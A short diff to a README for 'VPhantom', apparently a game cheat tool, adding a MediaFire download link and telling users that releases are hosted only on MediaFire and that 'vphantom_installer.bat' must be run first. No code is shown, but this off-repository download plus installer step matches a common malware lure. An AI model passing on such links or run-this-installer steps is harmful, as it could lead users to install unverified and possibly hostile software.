@@ -11,3 +11,7 @@
 ## ⚠️ We use MediaFire to upload VPhantom releases to the internet and you should download it from MediaFire too because we do not upload VPhantom releases to github.
 ## ⚠️ Before running VPhantom, you have to run "vphantom_installer.bat" first or else it won't work!
 ## ⚙️ VPhantom is completely coded using 📌 Python 📌
+
+# 📌 Links
+
+## ⚡ VPhantom External : https://www.mediafire.com/file/yyu3bn9mw2m1286/vphantom_external.zip/file
